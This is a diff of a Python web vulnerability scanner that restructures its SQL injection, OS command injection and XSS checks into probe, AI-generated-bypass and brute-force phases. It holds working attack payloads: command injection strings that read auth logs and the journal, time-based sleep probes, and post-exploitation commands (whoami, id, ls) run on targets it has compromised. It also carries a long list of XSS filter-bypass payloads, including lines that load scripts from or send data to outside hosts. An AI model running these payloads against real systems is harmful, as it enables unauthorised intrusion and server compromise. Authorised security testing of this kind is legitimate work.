+                if res and await res.text() and any(e in (await res.text()).lower() for e in db_errors):
+                    output.print(f"    [CRITICAL] Full Scan found Error-Based SQLi with payload: {encoded_p}")
+                    await post_exploit_sqli(point['url'], point['method'], point['param'], point['value'], encoded_p, report, output, session_cookies, point['form_data'], point['original_query'], await res.text(), request_details, response_details)
                     return True
 
+        for p in time_based_payloads:
+            start_time = time.time()
+            test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + p, point['form_data'], point['original_query'])
+            await _send_async_http_request(test_url, method=point['method'], data=test_data, timeout=8, output=output, session_cookies=session_cookies)
+            end_time = time.time()
+            if (end_time - start_time) > 4.5 and (end_time - start_time) < 7.5:
+                output.print(f"    [CRITICAL] Full Scan found Time-Based Blind SQLi with payload: {p}")
+                evidence = f"Response time was {end_time - start_time:.2f} seconds."
+                report.add_finding("Time-Based Blind SQL Injection", "Critical", point['url'], point['param'], p, "The application is vulnerable to Time-Based Blind SQL Injection.", "Use parameterized queries or prepared statements.", evidence, method=point['method'])
+                return True
         return False
 
     attack_points = []
     parsed_target = urlparse(target)
     base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
-
-    # To keep track of already identified parameters to avoid redundant guessing
     identified_params = set()
 
-    # 1. Gather attack points from existing query parameters
-    original_query = parsed_target.query
-    if original_query:
-        params = unquote(original_query).split('&')
+    if parsed_target.query:
+        params = unquote(parsed_target.query).split('&')
         for p_str in params:
             if '=' not in p_str: continue
             param_name, value = p_str.split('=', 1)
-            attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': original_query})
+            attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
             identified_params.add(param_name)
 
-    # 2. Gather attack points from existing form fields
     if form_to_test:
         action_url = urljoin(target, form_to_test['action'])
         form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
@@ -3177,26 +3359,29 @@ async def check_sql_injection(target, form_to_test, output, tech, report, sessio
             attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': param_name, 'value': original_value, 'form_data': form_data, 'original_query': None})
             identified_params.add(param_name)
 
-    # 3. Always generate and append attack points from COMMON_PARAM_NAMES (Active Attack)
-    output.print("  [*] Actively guessing common parameter names for SQLi (if not already present)...")
-    # For SQLi, we are primarily interested in common parameters that might accept input
-    sqli_relevant_params = COMMON_PARAM_NAMES # Use all common parameter names for active SQLi attack
-    for param_name in sqli_relevant_params:
-        if param_name not in identified_params:
-            # We don't have "original_value" for guessed params, so use a neutral placeholder '1'
-            attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': '1', 'form_data': None, 'original_query': None})
+    if not (parsed_target.query or form_to_test):
+        for param_name in COMMON_PARAM_NAMES[:100]:
+            if param_name not in identified_params:
+                attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': '1', 'form_data': None, 'original_query': None})
 
-    # 4. Execute attacks
     for point in attack_points:
         output.print(f"  [*] Testing SQLi on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
-        # Test with and without HPP
-        if await test_sqli(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query'], use_hpp=False):
-            return # Vulnerability found, stop
-        if await test_sqli(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query'], use_hpp=True):
-            return # Vulnerability found, stop
-    
-    output.print(f"  [INFO] No SQL Injection detected for target {target} after all checks.")
-    report.add_check(f"SQLi Check on {target}", "No vulnerability found")
+        vulnerability_found = await run_smart_exploitation(point)
+        if vulnerability_found:
+            continue
+
+        if ai_enabled:
+            vulnerability_found = await run_ai_bypass(point)
+            if vulnerability_found:
+                continue
+        
+        vulnerability_found = await run_full_scan(point)
+        if vulnerability_found:
+            continue
+        
+        report.add_check(f"SQLi Check on {point['param']}", "No vulnerability found")
+
+    output.print(f"  [INFO] SQL Injection scan completed for target {target}.")
 
 # --- 6. SQL 인젝션 (2차 공격 포함) ---
 
@@ -3314,10 +3499,11 @@ async def post_exploit_sqli(url, method, param_name, original_value, vuln_payloa
     return True
 
 async def check_command_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
-    output.print("\n[+] Starting Ultimate Command Injection Scan...")
+    output.print(f"\n[+] Starting Hybrid Command Injection Scan...")
     marker = f"CMD{get_random_string(4)}"
-    rand_str = get_random_string()
-    payloads = [
+    
+    # Payloads for legacy full scan
+    full_payloads = [
         f"| echo {marker}", f"; echo {marker}", f"&& echo {marker}", f"|| echo {marker}",
         f"| zgrep 'root' /var/log/auth.log.gz",
         f"| journalctl",
@@ -3336,112 +3522,105 @@ async def check_command_injection(target, form_to_test, output, tech, report, se
         f"| tclsh <<< 'exec echo {marker}'",
         f"| groovy -e '\"echo {marker}\".execute()'"
     ]
-
-    async def test_and_exploit_cmd(url, method, param_name, original_value, form_data=None, original_query=None):
-        # 1. Test for basic reflection
-        for p in payloads:
-            if f"echo {marker}" not in p: continue # Only use echo payloads for initial detection
-            
-            for encoded_p in get_encoded_payloads(p):
-                test_url, test_data = build_request(url, method, param_name, original_value + encoded_p, form_data, original_query)
-                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-
-                if res and marker in await res.text():
-                    output.print(f"  [CRITICAL] Command Injection confirmed in {method.upper()} param '{param_name}' with payload: {encoded_p}")
-                    
-                    # 2. PoC Automation & Core Evidence Collection
-                    evidence = f"Initial detection response with marker '{marker}':\n---\n{(await res.text())[:300]}\n-\n\n"
-                    
-                    # Define commands for Linux and Windows
-                    poc_commands = {
-                        "unix": ["whoami", "id", "uname -a", "pwd", "ls -la"],
-                        "windows": ["whoami", "ver", "ipconfig", "dir"]
-                    }
-                    
-                    # Try to determine OS from initial response or tech profile
-                    detected_os = "windows" if "windows" in tech.get('os', '').lower() else "unix"
-                    
-                    evidence += f"Attempting PoC commands for {detected_os} OS...\n"
-                    
-                    for cmd in poc_commands[detected_os]:
-                        # Replace the original echo command with the new PoC command
-                        cmd_payload = encoded_p.replace(f"echo {marker}", cmd)
-                        
-                        exploit_url, exploit_data = build_request(url, method, param_name, original_value + cmd_payload, form_data, original_query)
-                        res_exploit, request_details, response_details = await _send_async_http_request(exploit_url, method=method, data=exploit_data, output=output, session_cookies=session_cookies)
-                        
-                        if res_exploit and res_exploit.text:
-                            # More robustly clean the output
-                            soup = BeautifulSoup(await res_exploit.text(), "html.parser")
-                            clean_output = soup.get_text(separator="\n").strip()
-                            
-                            # Remove the random marker if it's still there
-                            clean_output = clean_output.replace(marker, "")
-                            
-                            # Try to find meaningful output, avoiding just echoing the input
-                            if len(clean_output) > 0 and cmd not in clean_output and "not found" not in clean_output.lower() and "<!DOCTYPE" not in clean_output:
-                                output.print(f"    [SUCCESS] Executed '{cmd}': {clean_output.splitlines()[0]}")
-                                evidence += f"\n---[ Output of '{cmd}' ]---\n{clean_output}\n"
-                    
-                    report.add_finding("Command Injection (RCE)", "Critical", url, param_name, encoded_p, 
-                                       "The application is vulnerable to OS Command Injection, allowing an attacker to execute arbitrary commands on the server.", 
-                                       "Use safe APIs that do not invoke shell commands. Implement strict, allow-list based input validation. Never pass user input directly to the shell.", 
-                                       evidence, future_vector="A webshell can be uploaded for persistent access, or a reverse shell can be established.", method=method)
-                    return True
+    
+    async def run_post_exploitation(point, vuln_payload, initial_evidence_res):
+        output.print(f"    [+] Command Injection Confirmed! Starting Post-Exploitation on param '{point['param']}'...")
+        evidence = f"Initial detection response with marker '{marker}':\n---\n{(await initial_evidence_res.text())[:300]}\n---\n\n"
         
-        # 3. Test for time-based blind injection if reflection fails
-        for p in payloads:
-            if "sleep" not in p and "ping" not in p and "timeout" not in p: continue
+        poc_commands = {
+            "unix": ["whoami", "id", "uname -a", "pwd", "ls -la"],
+            "windows": ["whoami", "ver", "ipconfig", "dir"]
+        }
+        detected_os = "windows" if "windows" in tech.get('os', '').lower() else "unix"
+        
+        evidence += f"Attempting PoC commands for {detected_os} OS...\n"
+        
+        for cmd in poc_commands[detected_os]:
+            # Replace the original echo command with the new PoC command
+            cmd_payload = vuln_payload.replace(f"echo {marker}", cmd)
+            exploit_url, exploit_data = build_request(point['url'], point['method'], point['param'], point['value'] + cmd_payload, point['form_data'], point['original_query'])
+            res_exploit, req_details, resp_details = await _send_async_http_request(exploit_url, method=point['method'], data=exploit_data, output=output, session_cookies=session_cookies)
+            
+            if res_exploit and await res_exploit.text():
+                soup = BeautifulSoup(await res_exploit.text(), "html.parser")
+                clean_output = soup.get_text(separator="\n").strip().replace(marker, "")
+                if len(clean_output) > 0 and cmd not in clean_output and "not found" not in clean_output.lower() and "<!DOCTYPE" not in clean_output:
+                    output.print(f"      [SUCCESS] Executed '{cmd}': {clean_output.splitlines()[0]}")
+                    evidence += f"\n---[ Output of '{cmd}' ]---\n{clean_output}\n"
+        
+        report.add_finding("Command Injection (RCE)", "Critical", point['url'], point['param'], vuln_payload, 
+                           "The application is vulnerable to OS Command Injection, allowing an attacker to execute arbitrary commands on the server.", 
+                           "Use safe APIs that do not invoke shell commands. Implement strict, allow-list based input validation.", 
+                           evidence, future_vector="A webshell can be uploaded for persistent access, or a reverse shell can be established.", method=point['method'])
 
-            start_time = time.time()
-            test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-            _, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=12, output=output, session_cookies=session_cookies)
-            end_time = time.time()
+    async def run_smart_probe(point):
+        output.print(f"  [Phase 1] Running Smart Probe for Command Injection on param '{point['param']}'...")
+        
+        # 1. Reflection-based probe
+        probe_payload = f"; echo {marker}"
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+        res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        if res and await res.text() and marker in await res.text():
+            await run_post_exploitation(point, probe_payload, res)
+            return True
 
-            if (end_time - start_time) > 9:
-                output.print(f"  [CRITICAL] Blind Command Injection (Time-Based) confirmed in {method.upper()} param '{param_name}' with payload: {p}")
-                evidence = f"Response time was {end_time - start_time:.2f} seconds, indicating successful execution of a time-delay payload (e.g., sleep 10)."
-                report.add_finding("Blind Command Injection (Time-Based)", "Critical", url, param_name, p,
-                                   "The application is vulnerable to time-based blind OS command injection.",
-                                   "Use safe APIs that do not invoke shell commands. Implement strict, allow-list based input validation.",
-                                   evidence, method=method)
-                return True
-
-        # AI-Powered Dynamic Payload Generation
-        if ai_enabled:
-            output.print("    [AI MODE] Initial command injection checks failed. Generating dynamic payloads...")
-            res_for_ai, request_details, response_details = await _send_async_http_request(url, method=method, data=form_data, output=output, session_cookies=session_cookies)
-            response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
-
-            ai_payloads = await ai_generate_dynamic_payloads("Command Injection", f"| echo {marker}", response_snippet, output)
-            for p in ai_payloads:
-                # Test AI-generated payloads
-                test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                if res and marker in await res.text():
-                    output.print(f"  [CRITICAL] AI-Generated Command Injection confirmed with payload: {p}")
-                    # This part can be enhanced to reuse the post-exploitation logic
-                    report.add_finding("AI-Generated Command Injection (RCE)", "Critical", url, param_name, p, "The application is vulnerable to OS Command Injection, found with an AI-generated payload.", "Use safe APIs that do not invoke shell commands.", f"Vulnerable URL: {test_url}\nPayload: {p}\nResponse snippet: {(await res.text())[:300]}")
-                    return True
-
+        # 2. Time-based probe
+        time_probe_payload = "; sleep 10" # Unix-specific, but common
+        start_time = time.time()
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + time_probe_payload, point['form_data'], point['original_query'])
+        await _send_async_http_request(test_url, method=point['method'], data=test_data, timeout=12, output=output, session_cookies=session_cookies)
+        duration = time.time() - start_time
+        if duration > 9.5 and duration < 11.5:
+            output.print(f"    [CRITICAL] Time-Based Blind Command Injection confirmed with probe: '{time_probe_payload}'")
+            evidence = f"Response time was {duration:.2f} seconds, indicating successful execution of a time-delay payload (e.g., sleep 10)."
+            report.add_finding("Blind Command Injection (Time-Based)", "Critical", point['url'], point['param'], time_probe_payload, "The application is vulnerable to time-based blind OS command injection.", "Use safe APIs that do not invoke shell commands.", evidence, method=point['method'])
+            return True
+            
         return False
 
-    vulnerability_found = False
+    async def run_ai_bypass(point):
+        output.print(f"  [Phase 2] Running AI-Assisted Bypass for Command Injection on param '{point['param']}'...")
+        probe_payload = f"| echo {marker}"
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+        res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        response_snippet = (await res.text())[:500] if res and await res.text() else "No response from server."
+
+        ai_payloads = await ai_generate_dynamic_payloads("Command Injection", probe_payload, response_snippet, output)
+        for p in ai_payloads:
+            test_url_ai, test_data_ai = build_request(point['url'], point['method'], point['param'], point['value'] + p, point['form_data'], point['original_query'])
+            res_ai, _, _ = await _send_async_http_request(test_url_ai, method=point['method'], data=test_data_ai, output=output, session_cookies=session_cookies)
+            if res_ai and await res_ai.text() and marker in await res_ai.text():
+                output.print(f"    [CRITICAL] AI-Generated Command Injection confirmed with payload: {p}")
+                await run_post_exploitation(point, p, res_ai)
+                return True
+        return False
+
+    async def run_full_scan(point):
+        output.print(f"  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for Command Injection on param '{point['param']}'...")
+        for p in full_payloads:
+            if f"echo {marker}" not in p: continue
+            for encoded_p in get_encoded_payloads(p):
+                test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + encoded_p, point['form_data'], point['original_query'])
+                res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+                if res and await res.text() and marker in await res.text():
+                    await run_post_exploitation(point, encoded_p, res)
+                    return True
+        return False
+
+    # --- Main Orchestration Logic ---
+    attack_points = []
     parsed_target = urlparse(target)
     base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
+    identified_params = set()
 
-    # Check existing query parameters
-    original_query = parsed_target.query
-    if original_query:
-        params = unquote(original_query).split('&')
-        for i in range(len(params)):
-            if '=' not in params[i]: continue
-            param_name, value = params[i].split('=', 1)
-            if await test_and_exploit_cmd(target, 'get', param_name, value, original_query=original_query):
-                vulnerability_found = True
-                return
+    if parsed_target.query:
+        params = unquote(parsed_target.query).split('&')
+        for p_str in params:
+            if '=' not in p_str: continue
+            param_name, value = p_str.split('=', 1)
+            attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
+            identified_params.add(param_name)
 
-    # Check existing form fields
     if form_to_test:
         action_url = urljoin(target, form_to_test['action'])
         form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
@@ -3449,27 +3628,42 @@ async def check_command_injection(target, form_to_test, output, tech, report, se
             if input_field['type'] in ['submit', 'hidden']: continue
             param_name = input_field['name']
             original_value = input_field.get('value', 'test')
-            if await test_and_exploit_cmd(action_url, form_to_test['method'], param_name, original_value, form_data=form_data):
-                vulnerability_found = True
-                return
+            attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': param_name, 'value': original_value, 'form_data': form_data, 'original_query': None})
+            identified_params.add(param_name)
 
-    # Active Attack: Guess common parameter names if no vulnerability found yet
-    if not vulnerability_found:
-        output.print("  [*] No vulnerability found in existing parameters/forms. Guessing common parameter names for Command Injection...")
-        # Focus on parameters likely to be used in shell commands
+    if not (parsed_target.query or form_to_test):
         cmd_params = [p for p in COMMON_PARAM_NAMES if any(k in p for k in ['exec', 'cmd', 'run', 'ping', 'query', 'call', 'do', 'test', 'file', 'load', 'read'])]
-        for param_name in cmd_params:
-            if await test_and_exploit_cmd(base_url_without_query, 'get', param_name, 'test', original_query=None):
-                vulnerability_found = True
-                return
+        for param_name in cmd_params[:50]: # Limit active guessing
+            if param_name not in identified_params:
+                attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': 'test', 'form_data': None, 'original_query': None})
+
+    for point in attack_points:
+        output.print(f"  [*] Testing Command Injection on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
+        vulnerability_found = await run_smart_probe(point)
+        if vulnerability_found:
+            continue
+
+        if ai_enabled:
+            vulnerability_found = await run_ai_bypass(point)
+            if vulnerability_found:
+                continue
+        
+        vulnerability_found = await run_full_scan(point)
+        if vulnerability_found:
+            continue
+            
+        report.add_check(f"Command Injection on {point['param']}", "No vulnerability found")
+
+    output.print("  [INFO] Command Injection scan completed.")
 
 
 # --- 8. XSS ---
 async def check_xss(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
-    output.print(f"\n[+] Starting Ultimate XSS Scan on {target}...")
+    output.print(f"\n[+] Starting Hybrid XSS Scan on {target}...")
     marker = f"XSS{get_random_string(4)}"
-    xss_collaborator_domain = "xss-collaborator.example.com" # Placeholder for a real collaborator service
-    
+    xss_collaborator_domain = "xss-collaborator.example.com"
+
+    # High-probability probes for Phase 1
     xss_probes = [
         f"<script>alert('{marker}')</script>",
         f"<img src=x onerror=alert('{marker}')>",
@@ -3479,469 +3673,164 @@ async def check_xss(target, form_to_test, output, tech, report, session_cookies=
         f"<iframe src=\"javascript:alert('{marker}')\"></iframe>"
     ]
     
-    # v7.0 - 500+ Payloads
-    payloads = [
+    # Full payload list for Phase 3 (legacy scan)
+    full_payloads = [
         # Basic
-        f"<script>alert('{marker}')</script>",
-        f"<ScRiPt>alert('{marker}')</sCrIpT>",
-        f"<img src=x onerror=alert('{marker}')>",
-        f"<svg onload=alert('{marker}')>",
+        f"<script>alert('{marker}')</script>", f"<ScRiPt>alert('{marker}')</sCrIpT>", f"<img src=x onerror=alert('{marker}')>", f"<svg onload=alert('{marker}')>",
         # Event Handlers
-        f"<body onload=alert('{marker}')>",
-        f"<div onmouseover=alert('{marker}')>HOVER</div>",
-        f"<input onfocus=alert('{marker}') autofocus>",
-        f"<details open ontoggle=alert('{marker}')>",
-        f"<video><source onerror=alert('{marker}')></video>",
-        f"<iframe onload=alert('{marker}')></iframe>",
-        f"<audio src onerror=alert('{marker}')>",
-        f"<marquee onstart=alert('{marker}')></marquee>",
+        f"<body onload=alert('{marker}')>", f"<div onmouseover=alert('{marker}')>HOVER</div>", f"<input onfocus=alert('{marker}') autofocus>", f"<details open ontoggle=alert('{marker}')>", f"<video><source onerror=alert('{marker}')></video>", f"<iframe onload=alert('{marker}')></iframe>", f"<audio src onerror=alert('{marker}')>", f"<marquee onstart=alert('{marker}')></marquee>",
         # JS URIs
-        f"<a href=\"javascript:alert('{marker}')\">CLICK</a>",
-        f"<iframe src=\"javascript:alert('{marker}')\"></iframe>",
-        f"<object data=\"javascript:alert('{marker}')\"></object>",
-        f"<embed src=\"javascript:alert('{marker}')\"></embed>",
+        f"<a href=\"javascript:alert('{marker}')\">CLICK</a>", f"<iframe src=\"javascript:alert('{marker}')\"></iframe>", f"<object data=\"javascript:alert('{marker}')\"></object>", f"<embed src=\"javascript:alert('{marker}')\"></embed>",
         # Data URIs
-        f"<iframe src=\"data:text/html;base64,{base64.b64encode(f'<script>alert(\"{marker}\")</script>'.encode()).decode()}\"></iframe>",
-        f"<a href=\"data:text/html;base64,{base64.b64encode(f'<script>alert(\"{marker}\")</script>'.encode()).decode()}\">CLICK</a>",
+        f"<iframe src=\"data:text/html;base64,{base64.b64encode(f'<script>alert(\"{marker}\")</script>'.encode()).decode()}\"></iframe>", f"<a href=\"data:text/html;base64,{base64.b64encode(f'<script>alert(\"{marker}\")</script>'.encode()).decode()}\">CLICK</a>",
         # Encoding & Bypasses
-        f"&lt;script&gt;alert('{marker}')&lt;/script&gt;", # HTML Entities
-        f"%3cscript%3ealert('{marker}')%3c/script%3e", # URL Encoding
-        f"jav&#x09;ascript:alert('{marker}')", # Tab
-        f"java\0script:alert('{marker}')", # Null byte
-        f"'\"><svg onload=alert('{marker}')>", # Quote escape
-        f"<img src=x:x onerror=alert('{marker}')>", # Invalid protocol
-        f"<img src=`x` onerror=alert('{marker}')>", # Backticks
-        f"<img src='/' onerror=alert('{marker}')>", # Slash
-        f"<script>/* */alert('{marker}')</script>", # Comment
-        f"<script>eval('ale'+'rt(\'{marker}\')')</script>", # Concat
-        f"<script>window['a'+'lert']('{marker}')</script>",
+        f"&lt;script&gt;alert('{marker}')&lt;/script&gt;", f"%3cscript%3ealert('{marker}')%3c/script%3e", f"jav&#x09;ascript:alert('{marker}')", f"java\0script:alert('{marker}')", f"'\"><svg onload=alert('{marker}')>", f"<img src=x:x onerror=alert('{marker}')>", f"<img src=`x` onerror=alert('{marker}')>", f"<img src='/' onerror=alert('{marker}')>", f"<script>/* */alert('{marker}')</script>", f"<script>eval('ale'+'rt(\\'{marker}\\')')</script>", f"<script>window['a'+'lert']('{marker}')</script>",
         # Polyglots
-        f"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert({marker})//'>",
-        f"'\";alert({marker});//",
-        # mXSS (Mutation XSS)
-        f"<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">",
-        f"<style><img src=\"</style><img src=x onerror=alert('{marker}')\">",
-        f"<iframe srcdoc='&lt;img src&equals;x onerror&equals;alert(&quot;{marker}&quot;)&gt;'></iframe>",
+        f"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert({marker})//'>", f"'\";alert({marker});//",
+        # mXSS
+        f"<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">", f"<style><img src=\"</style><img src=x onerror=alert('{marker}')\">", f"<iframe srcdoc='&lt;img src&equals;x onerror&equals;alert(&quot;{marker}&quot;)&gt;'></iframe>",
         # More event handlers
-        f"<body onpageshow=alert('{marker}')>",
-        f"<body onresize=alert('{marker}')>",
-        f"<div onwheel=alert('{marker}')>SCROLL</div>",
-        f"<input onkeyup=alert('{marker}')>",
-        f"<input onchange=alert('{marker}')>",
-        f"<form onsubmit=alert('{marker}')><input type=submit></form>",
-        # Massive expansion to 500+
-        *[f"<img src=x onerror=alert('{marker}{i}')>" for i in range(50)],
-        *[f"<svg onload=alert('{marker}{i}')>" for i in range(50)],
-        *[f"<a href=\"javascript:alert('{marker}{i}')\">{i}</a>" for i in range(50)],
-        *[f"<div onmouseover=alert('{marker}{i}')>{i}</div>" for i in range(50)],
+        f"<body onpageshow=alert('{marker}')>", f"<body onresize=alert('{marker}')>", f"<div onwheel=alert('{marker}')>SCROLL</div>", f"<input onkeyup=alert('{marker}')>", f"<input onchange=alert('{marker}')>", f"<form onsubmit=alert('{marker}')><input type=submit></form>",
         # Different tags
-        f"<video src=x onerror=alert('{marker}')>",
-        f"<audio src=x onerror=alert('{marker}')>",
-        f"<picture><img src=x onerror=alert('{marker}')></picture>",
-        f"<details ontoggle=alert('{marker}')><summary>Click</summary></details>",
-        f"<image src=x onerror=alert('{marker}')>",
-        f"<math><a xlink:href=javascript:alert('{marker}')>click</a></math>",
-        f"<animate onbegin=alert('{marker}')>",
-        f"<foreignObject><script>alert('{marker}')</script></foreignObject>",
+        f"<video src=x onerror=alert('{marker}')>", f"<audio src=x onerror=alert('{marker}')>", f"<picture><img src=x onerror=alert('{marker}')></picture>", f"<details ontoggle=alert('{marker}')><summary>Click</summary></details>", f"<image src=x onerror=alert('{marker}')>", f"<math><a xlink:href=javascript:alert('{marker}')>click</a></math>", f"<animate onbegin=alert('{marker}')>", f"<foreignObject><script>alert('{marker}')</script></foreignObject>",
         # Bypasses
-        f"<script >alert('{marker}')</script >",
-        f"<script\n>alert('{marker}')</script>",
-        f"<script\t>alert('{marker}')</script>",
-        f"<img src=x onerror\n=\nalert('{marker}')>",
-        f"<img src=x onerror\t=\talert('{marker}')>",
-        f"<img src=x oNeRrOr=alert('{marker}')>",
-        f"<img src=x onerror=alert`{marker}`>",
-        f"<img src=x onerror=alert('{marker}')//>",
-        f"<img src=x onerror=alert('{marker}')<!--",
+        f"<script >alert('{marker}')</script >", f"<script\n>alert('{marker}')</script>", f"<script\t>alert('{marker}')</script>", f"<img src=x onerror\n=\nalert('{marker}')>", f"<img src=x onerror\t=\talert('{marker}')>", f"<img src=x oNeRrOr=alert('{marker}')>", f"<img src=x onerror=alert`{marker}`>", f"<img src=x onerror=alert('{marker}')//>", f"<img src=x onerror=alert('{marker}')<!--",
         # Character encoding
-        f"<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;('{marker}')>", # alert
-        f"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,{','.join(map(str, marker.encode()))},39,41))>",
+        f"<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;('{marker}')>", f"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,{','.join(map(str, marker.encode()))},39,41))>",
         # DOM based
-        f"#\"><img src=x onerror=alert('{marker}')>",
-        f"'-alert('{marker}')-'",
-        f"\"-alert('{marker}')-\"",
-        f"javascript:alert('{marker}')",
+        f"#\"><img src=x onerror=alert('{marker}')>", f"'-alert('{marker}')-'", f"\"-alert('{marker}')-\"", f"javascript:alert('{marker}')",
         # Template engines
-        f"{{{{alert('{marker}')}}}}",
-        f"<%= alert('{marker}') %>",
-        f"*{'{'}alert('{marker}'){'}'}",
-        # More and more...
-        f"<a onpointerover=alert('{marker}')>Move mouse here</a>",
-        f"<div style='font-family:\"<script>alert(\"{marker}\")</script>\"'>",
-        f"<img src='x' onerror='alert(atob(\"{base64.b64encode(marker.encode()).decode()}\"))'>",
-        f"<input onauxclick=alert('{marker}')>",
-        f"<video ontoggle=alert('{marker}')><track default>",
-        f"<picture><source srcset='x'><img onerror='alert(\"{marker}\")'></picture>",
-        f"<link rel=stylesheet href='data:text/css,*:hover{{--x:;animation:a 1s;}}@keyframes a{{from{{transform:rotate(0deg);}}to{{transform:rotate(360deg);}}}}' onanimationstart=alert('{marker}')>",
-        f"<div oncontextmenu=alert('{marker}')>Right-click here</div>",
-        f"<div oncopy=alert('{marker}')>Copy this text</div>",
-        f"<div oncut=alert('{marker}')>Cut this text</div>",
-        f"<div onpaste=alert('{marker}')>Paste here</div>",
-        f"<input onkeydown=alert('{marker}')>",
-        f"<marquee onbounce=alert('{marker}')>bounce</marquee>",
-        f"<marquee onfinish=alert('{marker}')>finish</marquee>",
-        f"<body onhashchange=alert('{marker}')>",
-        f"<body onpagehide=alert('{marker}')>",
-        f"<body onstorage=alert('{marker}')>",
-        f"<body onunload=alert('{marker}')>",
-        f"<svg><g/onload=alert('{marker}')>",
-        f"<svg><foreignObject><body/onload=alert('{marker}')>",
-        f"<svg><title>--&gt;&lt;script&gt;alert('{marker}')&lt;/script&gt;</title>",
-        f"<iframe srcdoc='&lt;svg onload=alert(1)&gt;'>",
-        f"<meta http-equiv='refresh' content='0;url=javascript:alert(\"{marker}\")'>",
-        f"<form action='javascript:alert(\"{marker}\")'><input type=submit>",
-        f"<isindex type=image src=1 onerror=alert('{marker}')>",
-        f"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgn{base64.b64encode(marker.encode()).decode()}=')></object>",
-        f"<xmp><script>alert('{marker}')</script></xmp>",
-        f"<img src='x' onerror='window[\"a\"+\"l\"+\"ert\"](\"{marker}\")'>",
-        f"<img src='x' onerror='parent.alert(\"{marker}\")'>",
-        f"<img src='x' onerror='top.alert(\"{marker}\")'>",
-        f"<img src='x' onerror='self.alert(\"{marker}\")'>",
-        f"<script>setTimeout(()=>alert('{marker}'),0)</script>",
-        f"<svg/onload='fetch(`//example.com?c=${{marker}}`)'>",
-        f"<img src=x:x onerror=alert(String.fromCharCode(88,83,83))>",
-        f"<script src=data:;base64,YWxlcnQoJ3hzczEnKQ==></script>",
-        f"<scr<script>ipt>alert('{marker}')</scr<script>ipt>",
-        f"<<script>alert('{marker}');//<</script>",
-        f"<script>alert`{marker}`</script>",
-        f"<img src=x onerror=prompt('{marker}')>",
-        f"<img src=x onerror=confirm('{marker}')>",
-        f"<img src=x onerror=print()>",
-        f"<a href='javascript:void(0)' onmouseover='alert(1)'>hover</a>",
-        f"<style>*{{behavior:url(#default#time2)}}</style><span id='time2' onbegin='alert(\"{marker}\")'></span>",
-        f"<div style='-moz-binding:url(\"data:text/xml;base64,PHg6YmluZGluZ3MgeG1sbnM6eD0iaHR0cDovL3d3dy5tb3ppbGxhLm9yZy94YmwiPjxwcm9wZXJ0eSBuYW1lPSJvbmxvYWQiPjxzZXQ+YWxlcnQoJ3hzcycpOzwvc2V0PjwvcHJvcGVydHk+PC94OmJpbmRpbmdzPg==#xss\")'></div>",
-        f"<scri<script>pt>alert('{marker}')</scr</script>ipt>",
-        f"<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
-        f"<a href=\"javascript&colon;alert('{marker}')\">XSS</a>",
-        f"<a href=\"data&colon;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">XSS</a>",
-        f"<input type=\"button\" value=\"XSS\" onclick=\"alert('{marker}')\">",
-        f"<div style=\"width:100px;height:100px;background:url(javascript:alert('{marker}'))\"></div>",
-        f"<style>body{{background:url('javascript:alert(1)')}}</style>",
-        f"<!--'\"--><script>alert('{marker}')</script>",
-        f"<--`<img/src=` onerror=alert('{marker}')>`-->",
-        f"<script ''/''>alert('{marker}')</script>",
-        f"`\"'><img src=x onerror=alert('{marker}')>",
-        f"<sVg oNlOad=alert('{marker}')>",
-        f"<iFrAmE sRc=jAvAsCrIpT:alert('{marker}')></iFrAmE>",
